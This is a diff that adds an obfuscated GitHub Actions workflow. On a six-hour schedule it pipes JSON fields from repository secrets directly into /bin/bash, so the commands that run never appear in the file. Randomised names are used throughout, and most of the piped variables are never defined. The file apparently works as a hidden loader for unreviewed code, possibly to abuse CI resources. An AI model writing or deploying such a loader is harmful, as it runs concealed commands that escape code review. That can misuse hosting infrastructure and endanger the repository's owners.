@@ -1,0 +1,27 @@
+name: fanwenmi1294
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fanwenmi1294
+        env:
+          frlbf84135: ${{ secrets.frlbf84135 }}
+        run: |
+          echo $frlbf84135 | jq -r .qxqh22497 | /bin/bash
+          echo $vac1 | jq -r .phf517 | /bin/bash
+          echo $zhcu89 | jq -r .da251 | /bin/bash
+          echo $dxrex0011 | jq -r .jxh649 | /bin/bash
+          echo $vr889 | jq -r .lgu9889 | /bin/bash
+          echo $xlj8784 | jq -r .i6109 | /bin/bash
+          echo $b2897 | jq -r .v25 | /bin/bash
+          echo $pvxwc68 | jq -r .czb2 | /bin/bash
+          echo $mbx0 | jq -r .gd47 | /bin/bash
+          echo $frq9 | jq -r .hpu93 | /bin/bash
+          echo $fbp732 | jq -r .fqkz1649 | /bin/bash
+          echo $srmc50729 | jq -r .vfuw7041 | /bin/bash
+
